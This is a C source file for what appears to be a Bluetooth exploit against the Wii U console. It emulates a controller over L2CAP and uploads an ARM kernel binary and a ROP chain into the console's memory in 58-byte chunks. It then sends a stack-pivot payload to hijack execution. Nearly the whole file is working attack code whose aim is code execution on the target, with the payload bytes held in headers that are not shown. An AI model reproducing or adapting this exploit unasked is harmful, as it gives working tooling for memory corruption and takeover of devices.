#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <sys/time.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdbool.h>
#include <string.h>
#include <poll.h>
#include <assert.h>

#define kernel_check_size(size) \
  static_assert(sizeof(arm_kernel) <= size, "Kernel exceeds " #size " bytes")

#include "sdp.h"
#include "adapter.h"

#include "payloads.h"

#include "arm_kernel/arm_kernel.bin.h"
kernel_check_size(803); // if we go larger we can't push the payload after pairing

#define PSM_SDP 1
#define PSM_CTRL 0x11
#define PSM_INT 0x13

bdaddr_t host_bdaddr;
int has_host = 0;

int sdp_fd, ctrl_fd, int_fd;
int sock_sdp_fd, sock_ctrl_fd, sock_int_fd;

static int is_connected = 0;

//signal handler to break out of main loop
static int running = 1;
void sig_handler(int sig)
{
  running = 0;
}

int create_socket()
{
  int fd;
  struct linger l = { .l_onoff = 1, .l_linger = 5 };
  int opt = 0;

  fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
  if (fd < 0)
  {
    return -1;
  }

  if (setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l)) < 0)
  {
    close(fd);
    return -1;
  }

  if (setsockopt(fd, SOL_L2CAP, L2CAP_LM, &opt, sizeof(opt)) < 0)
  {
    close(fd);
    return -1;
  }

  return fd;
}

int l2cap_connect(bdaddr_t bdaddr, int psm)
{
  int fd;
  struct sockaddr_l2 addr;

  fd = create_socket();
  if (fd < 0)
  {
    return -1;
  }

  memset(&addr, 0, sizeof(addr));
  addr.l2_family = AF_BLUETOOTH;
  addr.l2_psm    = htobs(psm);
  addr.l2_bdaddr = bdaddr;

  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
  {
    close(fd);
    return -1;
  }

  return fd;
}

int l2cap_listen(int psm)
{
  int fd;
  struct sockaddr_l2 addr;

  fd = create_socket();
  if (fd < 0)
  {
    return -1;
  }

  memset(&addr, 0, sizeof(addr));
  addr.l2_family = AF_BLUETOOTH;
  addr.l2_psm = htobs(psm);
  addr.l2_bdaddr = *BDADDR_ANY;

  if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
  {
    close(fd);
    return -1;
  }

  if (listen(fd, 1) < 0)
  {
    close(fd);
    return -1;
  }

  return fd;
}

int listen_for_connections()
{
  sock_sdp_fd = l2cap_listen(PSM_SDP);
  if (sock_sdp_fd < 0)
  {
    printf("can't listen on psm %d: %s\n", PSM_SDP, strerror(errno));
    return -1;
  }

  sock_ctrl_fd = l2cap_listen(PSM_CTRL);
  if (sock_ctrl_fd < 0)
  {
    printf("can't listen on psm %d: %s\n", PSM_CTRL, strerror(errno));
    return -1;
  }

  sock_int_fd = l2cap_listen(PSM_INT);
  if (sock_int_fd < 0)
  {
    printf("can't listen on psm %d: %s\n", PSM_INT, strerror(errno));
    return -1;
  }

  return 0;
}

int accept_connection(int socket_fd, bdaddr_t * bdaddr)
{
  int fd;
  struct sockaddr_l2 addr;
  socklen_t opt = sizeof(addr);

  fd = accept(socket_fd, (struct sockaddr *)&addr, &opt);
  if (fd < 0)
  {
    return -1;
  }

  if (bdaddr != NULL)
  {
    *bdaddr = addr.l2_bdaddr;
  }

  return fd;
}

int connect_to_host()
{
  ctrl_fd = l2cap_connect(host_bdaddr, PSM_CTRL);
  if (ctrl_fd < 0)
  {
    printf("can't connect to host psm %d: %s\n", PSM_CTRL, strerror(errno));
    return -1;
  }

  int_fd = l2cap_connect(host_bdaddr, PSM_INT);
  if (int_fd < 0)
  {
    printf("can't connect to host psm %d: %s\n", PSM_INT, strerror(errno));
    return -1;
  }

  return 0;
}

void disconnect()
{
  shutdown(sdp_fd, SHUT_RDWR);
  shutdown(ctrl_fd, SHUT_RDWR);
  shutdown(int_fd, SHUT_RDWR);

  close(sdp_fd);
  close(ctrl_fd);
  close(int_fd);

  sdp_fd = 0;
  ctrl_fd = 0;
  int_fd = 0;
}

static int upload_to_memory(uint32_t dst, const void* data, uint32_t size)
{
  uint32_t offset = 0;
  while (size > 0) {
    uint32_t to_send = 58;
    if (size < to_send) { // copying small sizes tends to fail so we pad the rest with 0
      *(uint32_t*) (upload_data_payload + 87) = __builtin_bswap32(dst + offset);
      *(uint32_t*) (upload_data_payload + 95) = __builtin_bswap32(to_send);
      memcpy(upload_data_payload + 1, ((uint8_t*) data) + offset, size);
      memset(upload_data_payload + 1 + size, 0, to_send - size);
      to_send = size;
    }
    else {
      *(uint32_t*) (upload_data_payload + 87) = __builtin_bswap32(dst + offset);
      *(uint32_t*) (upload_data_payload + 95) = __builtin_bswap32(to_send);
      memcpy(upload_data_payload + 1, ((uint8_t*) data) + offset, to_send);
    }

    int res = send(int_fd, upload_data_payload, sizeof(upload_data_payload), 0);
    if (res != sizeof(upload_data_payload)) {
      return -1;
    }

    offset += to_send;
    size -= to_send;

    printf("sent %u\r", offset);
    fflush(stdout);
    usleep(1000 * 100);
  }

  printf("\n");
  return 0;
}

int main(int argc, char *argv[])
{
  struct pollfd pfd[6];
  unsigned char buf[256];
  ssize_t len;

  int failure = 0;

  if (argc != 1 && argc != 2) {
    printf("Usage: %s <wiiu-bdaddr>\n\nwiiu-bdaddr: Bluetooth device address of the Wii U (optional)\n", *argv);
    return 1;
  }

  if (argc == 2) {
    if (bachk(argv[1]) < 0)
    {
      printf("Usage: %s <wiiu-bdaddr>\n\nwiiu-bdaddr: Bluetooth device address of the Wii U (optional)\n", *argv);
      return 1;
    }

    str2ba(argv[1], &host_bdaddr);
    has_host = 1;
  }

  //set up unload signals
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);
  signal(SIGHUP, sig_handler);
  
  if (set_up_device(NULL) < 0)
  {
    printf("failed to set up Bluetooth device\n");
    return 1;
  }

  if (has_host)
  {
    printf("connecting to host...\n");
    if (connect_to_host() < 0)
    {
      printf("couldn't connect\n");
      running = 0;
    }
    else
    {
      char straddr[18];
      ba2str(&host_bdaddr, straddr);
      printf("connected to %s\n", straddr);

      is_connected = 1;
    }
  }
  else
  {
    if (listen_for_connections() < 0)
    {
      printf("couldn't listen\n");
      running = 0;
    }
    else
    {
      printf("listening for connections... (press wii u's sync button)\n");
    }
  }

  while (running)
  {
    memset(&pfd, 0, sizeof(pfd));

    // Listen for data on either fd
    //setting this to zero is not required for every call...
    //... also POLLERR has no effect in the events field
    pfd[0].fd = sock_sdp_fd;
    pfd[0].events = POLLIN;
    pfd[1].fd = sock_ctrl_fd;
    pfd[1].events = POLLIN;
    pfd[2].fd = sock_int_fd;
    pfd[2].events = POLLIN;

    pfd[3].fd = sdp_fd;
    pfd[3].events = POLLIN | POLLOUT;
    pfd[4].fd = ctrl_fd;
    pfd[4].events = POLLIN;
    pfd[5].fd = int_fd;
    pfd[5].events = POLLIN;

    // Check data PSM for output if it's time to send a report
    if (is_connected)
    {
      pfd[5].events |= POLLOUT;
    }

    if (poll(pfd, 6, 0) < 0)
    {
      printf("poll error\n");
      break;
    }

    if (pfd[4].revents & POLLERR)
    {
      printf("error on ctrl psm\n");
      break;
    }
    if (pfd[5].revents & POLLERR)
    {
      printf("error on data psm\n");
      break;
    }

    if (pfd[0].revents & POLLIN)
    {
      sdp_fd = accept_connection(pfd[0].fd, NULL);
      if (sdp_fd < 0)
      {
        printf("error accepting sdp connection\n");
        break;
      }
    }
    if (pfd[1].revents & POLLIN)
    {
      ctrl_fd = accept_connection(pfd[1].fd, NULL);
      if (ctrl_fd < 0)
      {
        printf("error accepting ctrl connection\n");
        break;
      }
    }
    if (pfd[2].revents & POLLIN)
    {
      int_fd = accept_connection(pfd[2].fd, &host_bdaddr);
      if (int_fd < 0)
      {
        printf("error accepting int connection\n");
        break;
      }

      char straddr[18];
      ba2str(&host_bdaddr, straddr);
      printf("connected to %s\n", straddr);

      is_connected = 1;
      has_host = 1;
    }

    if (pfd[3].revents & POLLIN)
    {
      len = recv(sdp_fd, buf, 32, MSG_DONTWAIT);
      if (len > 0)
      {
        sdp_recv_data(buf, len);
      }
    }
    if (pfd[3].revents & POLLOUT)
    {
      len = sdp_get_data(buf);
      if (len > 0)
      {
        send(sdp_fd, buf, len, MSG_DONTWAIT);
      }
    }

    if (is_connected)
    {
      if (pfd[5].revents & POLLOUT)
      {
        int res = upload_to_memory(ARM_KERNEL_LOCATION, arm_kernel, arm_kernel_size);
        if (res != 0) {
          printf("failed to send kernel bin\n");
          break;
        }

        printf("kernel bin sent\n");
        usleep(1000 * 100);

        final_rop_chain[184] = arm_kernel_size;

        for (int i = 0; i < sizeof(final_rop_chain) / 4; i++) {
          final_rop_chain[i] = __builtin_bswap32(final_rop_chain[i]);
        }

        res = upload_to_memory(ROP_CHAIN_LOCATION, final_rop_chain, sizeof(final_rop_chain));
        if (res != 0) {
          printf("failed to send rop\n");
          break;
        }

        printf("rop sent\n");
        usleep(1000 * 100);

        res = send(int_fd, stackpivot_payload, sizeof(stackpivot_payload), 0);
        if (res != sizeof(stackpivot_payload)) {
          printf("failed to send stack pivot payload\n");
          break;
        }

        printf("pivot (size %d) sent\n", res);
        running = false;
      }
      else
      {
        if (++failure > 3)
        {
          printf("connection timed out\n");
          break;
        }

        usleep(2*1000*1000);
      }
    }

    usleep(20*1000);
  }

  printf("cleaning up...\n");

  disconnect();

  close(sock_sdp_fd);
  close(sock_ctrl_fd);
  close(sock_int_fd);

  restore_device();

  return 0;
}
